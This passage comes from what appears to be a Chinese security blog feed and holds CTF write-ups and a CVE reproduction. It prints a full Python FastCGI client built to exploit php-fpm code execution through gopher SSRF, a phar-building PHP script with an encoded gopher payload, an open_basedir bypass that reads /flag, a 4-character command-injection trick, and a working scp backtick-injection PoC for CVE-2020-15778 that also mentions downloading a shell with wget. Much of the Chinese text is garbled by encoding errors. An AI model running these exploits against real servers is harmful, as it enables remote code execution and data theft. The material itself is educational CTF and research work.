class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">       <span class="comment"># if not self.__connect():</span></span><br><span class="line">        <span class="comment">#    print('connect failure! please check your fasctcgi-server !!')</span></span><br><span class="line">         <span class="comment">#   return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="comment">#print base64.b64encode(request)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">        <span class="comment"># self.sock.send(request)</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['response'] = b''</span></span><br><span class="line">        <span class="comment"># return self.__waitForResponse(requestId)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php phpinfo(); exit; ?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(content),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    response = urllib.quote(response)</span><br><span class="line">    print(<span class="string">"gopher://127.0.0.1:"</span> + str(args.port) + <span class="string">"/_"</span> + response)</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è„šæœ¬æ¥è‡ª<a href="https://evoa.me/archives/6/#PHP-FPM" target="_blank" rel="noopener">https://evoa.me/archives/6/#PHP-FPM</a> evoaå¸ˆå‚…çš„åšå®¢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> $url=<span class="string">"gopher://173.111.147.11:9000/_%01%01%D7%96%00%08%00%00%00%01%00%00%00%00%00%00%01%04%D7%96%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%D7%96%00%00%00%00%01%05%D7%96%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%D7%96%00%00%00%00"</span>;</span><br><span class="line">&#125;</span><br><span class="line">    @unlink(<span class="string">'phar.phar'</span>);</span><br><span class="line">    $obj = <span class="keyword">new</span> Main;</span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>, <span class="number">0</span>);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">    $p-&gt;setMetadata($obj);</span><br><span class="line">    $p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<img src="/2020/07/30/NCTF2019-phar-matches-everything/6.png" class="">

<p>å¯ä»¥çœ‹åˆ°æˆåŠŸè®¿é—®åˆ°äº†phpinfoé¡µé¢ï¼Œçœ‹åˆ°äº†ç»å¤§å¤šæ•°ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå‡½æ•°è¢«banï¼Œå‘ç°<code>open_basedirï¼š**/var/www/html:/tmp**</code></p>
<p>ä¸‹é¢å°±æ˜¯å¥—ç»•è¿‡open_basedirçš„payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt;</span><br></pre></td></tr></table></figure>

<img src="/2020/07/30/NCTF2019-phar-matches-everything/7.png" class="">

<p>å†é‡æ–°ç”Ÿæˆä¸€ä¸‹pharæ–‡ä»¶å†ä¼ ä¸Šå»è®¿é—®</p>
<img src="/2020/07/30/NCTF2019-phar-matches-everything/8.png" class="">]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>NLcommand</title>
    <url>/2020/08/18/NLcommand/</url>
    <content><![CDATA[<h2 id="ã€nlã€‘éš¾äº†"><a href="#ã€nlã€‘éš¾äº†" class="headerlink" title="ã€nlã€‘éš¾äº†"></a>ã€nlã€‘éš¾äº†<a id="more"></a></h2><p>å¼€å§‹è¿™é“é¢˜ä¹‹å‰å…ˆæ¥çœ‹ç‚¹ä¾‹å­ï¼Œçœ‹å®Œå°±çŸ¥é“æ€ä¹ˆåšäº†</p>
<h3 id="nlå‘½ä»¤"><a href="#nlå‘½ä»¤" class="headerlink" title="nlå‘½ä»¤"></a>nlå‘½ä»¤</h3><p>nlå‘½ä»¤å…¶å®å°±æ˜¯linuxä¸‹è®¡ç®—æ–‡ä»¶ä¸­çš„è¡Œå·</p>
<img src="/2020/08/18/NLcommand/1.png" class="">

<p>å¯ä»¥çœ‹åˆ°ä¸å•å•è¿”å›äº†è¡Œå·è¿˜è¿”å›äº†å¯¹åº”è¡Œå·çš„å†…å®¹</p>
<p>ä¸‹é¢å†æ¥çœ‹ä¸€ä¸ªå°å®éªŒ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir tmp</span><br><span class="line">&gt;nl</span><br><span class="line">&gt;a.txt</span><br><span class="line">vim a.txt</span><br><span class="line">*</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/NLcommand/2.png" class="">

<p>å…ˆå°†nlå‘½ä»¤å†™å…¥æ–‡ä»¶å¤¹ï¼Œè¿™é‡Œç”¨åˆ°äº†é€šé…ç¬¦<code>*</code>,ä¼šå°†æ–‡ä»¶å¤¹ä¸‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åå½“ä½œbashå‘½ä»¤æ¥æ‰§è¡Œï¼Œå…¶ä»–æ–‡ä»¶åå…¨éƒ¨éƒ½æ˜¯å‚æ•°ï¼Œé€šè¿‡å†™å…¥nlï¼Œå†å†™å…¥æµ‹è¯•çš„æ–‡ä»¶ï¼Œè°ƒç”¨é€šé…ç¬¦å°±èƒ½è¯»å–è¯¥è·¯å¾„ä¸‹æ‰€æœ‰æ–‡ä»¶çš„è¡Œå·åŠå…¶å†…å®¹ï¼Œè¿™é“é¢˜ä¹Ÿæ˜¯è¿™æ ·</p>
<p>å…ˆæ¥çœ‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"hack!!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//by Firebasky</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°shellçš„é•¿åº¦ä¸èƒ½è¶…è¿‡4ä½ï¼Œè¶…è¿‡å°±ä¼šæŠ¥hack</p>
<p>è¿™é‡Œå°±ç”¨ä¸Šé¢çš„æ–¹æ³•ï¼Œå…ˆå†™å…¥<code>nl</code>ï¼Œå†ç”¨é€šé…ç¬¦è¯»å–å³å¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;&gt;nl</span><br><span class="line">?1&#x3D;*</span><br></pre></td></tr></table></figure>

<p>å†æºç å¤„æ‰¾åˆ°flag</p>
<img src="/2020/08/18/NLcommand/3.png" class="">

<p>é¡ºä¾¿å›é¡¾ä¹‹å‰æ•´ç†è¿‡çš„çŸ¥è¯†ï¼š</p>
<p>æ‹“å±•ï¼š</p>
<p>æ€è·¯ï¼šä»£æ›¿cat<br>cat ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º</p>
<p>tac ä»æœ€åä¸€è¡Œå€’åºæ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º</p>
<p>more æ ¹æ®çª—å£å¤§å°ï¼Œä¸€é¡µä¸€é¡µçš„ç°å®æ–‡ä»¶å†…å®¹</p>
<p>less å’Œmoreç±»ä¼¼ï¼Œä½†å…¶ä¼˜ç‚¹å¯ä»¥å¾€å‰ç¿»é¡µï¼Œè€Œä¸”è¿›è¡Œå¯ä»¥æœç´¢å­—ç¬¦</p>
<p>head åªæ˜¾ç¤ºå¤´å‡ è¡Œ</p>
<p>tail åªæ˜¾ç¤ºæœ€åå‡ è¡Œ</p>
<p>nl ç±»ä¼¼äºcat -nï¼Œæ˜¾ç¤ºæ—¶è¾“å‡ºè¡Œå·</p>
<p>tailf ç±»ä¼¼äºtail -f</p>
<p>sort  å‘½ä»¤ç”¨äºå°†æ–‡æœ¬æ–‡ä»¶å†…å®¹åŠ ä»¥æ’åºã€‚</p>
<p>od  odæŒ‡ä»¤ä¼šè¯»å–æ‰€ç»™äºˆçš„æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶å°†å…¶å†…å®¹ä»¥å…«è¿›åˆ¶å­—ç å‘ˆç°å‡ºæ¥ã€‚</p>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenSSHçš„scpå‘½ä»¤æ³¨å…¥CVE-2020-15778</title>
    <url>/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/</url>
    <content><![CDATA[<p>å¤ç°çš„ç¬¬ä¸€ä¸ªCVEï¼Œè™½ç„¶æ¯”è¾ƒé¸¡è‚‹çš„æ„Ÿè§‰ï¼Œä½†è¿˜æ˜¯æœ‰å¿…è¦è®°å½•ä¸€ä¸‹<a id="more"></a></p>
<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æ„Ÿè§‰æ¯”è¾ƒé¸¡è‚‹çš„åŸå› ï¼Œå°±æ˜¯å¾—å…ˆçŸ¥é“sshçš„ç™»å½•å¯†ç ï¼Œè¿™ä¸€ç‚¹è¿˜æ˜¯æ¯”è¾ƒå›°éš¾çš„</p>
<p>OpenSSHçš„8.3p1ä¸­çš„scpå…è®¸åœ¨scp.cè¿œç¨‹åŠŸèƒ½ä¸­æ³¨å…¥å‘½ä»¤ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤</p>
<p>SCP(secure copy)æ˜¯linuxç³»ç»Ÿä¸‹åŸºäºsshç™»å½•è¿›è¡Œå®‰å…¨è¿œç¨‹æ–‡ä»¶æ‹·è´çš„å‘½ä»¤ï¼Œå¯ä»¥åœ¨linuxä¹‹é—´å¤åˆ¶æ–‡ä»¶å’Œç›®å½•</p>
<h3 id="äº§å“"><a href="#äº§å“" class="headerlink" title="äº§å“"></a>äº§å“</h3><p><strong>Openssh</strong></p>
<h3 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h3><p>OpenSSH&lt;=8.3p1</p>
<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>ä½¿ç”¨scpå¤åˆ¶æ–‡ä»¶åˆ°è¿œç¨‹æœåŠ¡å™¨æ—¶ï¼Œåœ¨scpå‘½ä»¤åé¢è·Ÿä¸Šæ–‡ä»¶çš„è·¯å¾„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp SourceFile user@ip:directory&#x2F;TargetFile</span><br></pre></td></tr></table></figure>

<p>scpä¼šä½¿ç”¨â€-tâ€œå‚æ•°æ¥è·å–å­˜å‚¨ä¼ å…¥æ–‡ä»¶çš„è·¯å¾„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp -t directory&#x2F;TargetFile</span><br></pre></td></tr></table></figure>

<img src="/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/1.png" class="">

<p>é—®é¢˜åœ¨<code>scp.c</code>æ–‡ä»¶çš„989è¡Œï¼Œä¼ å…¥è·¯å¾„æœªè¿›è¡Œæ£€æµ‹ï¼Œåˆ©ç”¨åå¼•å·å¯ä»¥åŒ…è£¹pocï¼ŒåŠ ä¸Šæ–‡ä»¶åæ‰§è¡Œscpå‘½ä»¤ã€‚è¿™ä½¿å¾—æ”»å‡»è€…æ‰§è¡Œå¸¦æœ‰åå¼•å·çš„æœ‰æ•ˆscpå‘½ä»¤æ—¶ï¼Œæœ¬åœ°shellè¿˜å°†æ‰§è¡Œåå¼•å·ä¸­çš„å‘½ä»¤</p>
<h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç¯å¢ƒ</span><br><span class="line">é¶æœºï¼šcentos</span><br><span class="line">æ”»å‡»æœºï¼škali</span><br><span class="line">åœºæ™¯ï¼šå·²çŸ¥sshå¯†ç </span><br></pre></td></tr></table></figure>

<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp 111.txt root@ip:'/tmp/test/111'</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æˆåŠŸé€šè¿‡scpå‘é€åˆ°é¶æœº</p>
<img src="/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/2.png" class="">

<p>æ¥ä¸‹æ¥è¯•ç€åˆ›å»ºä¸€ä¸ªhack.shæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºç©ºï¼Œå¯ä»¥åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ­å»ºåŒ…å«shellçš„hack.shï¼Œé€šè¿‡wgetå‘½ä»¤ä¸‹è½½shellå¹¶ä¸”æ‰§è¡Œï¼Œè¿™é‡Œä¸æ¼”ç¤ºè¿™ä¸ªè¿‡ç¨‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp 111.txt root@ip:'`touch /tmp/test/hack.sh`/tmp/test/444'</span><br></pre></td></tr></table></figure>

<img src="/2020/10/01/OpenSSH%E7%9A%84scp%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/3.png" class="">

<p>å¸¦wgetçš„poc</p>
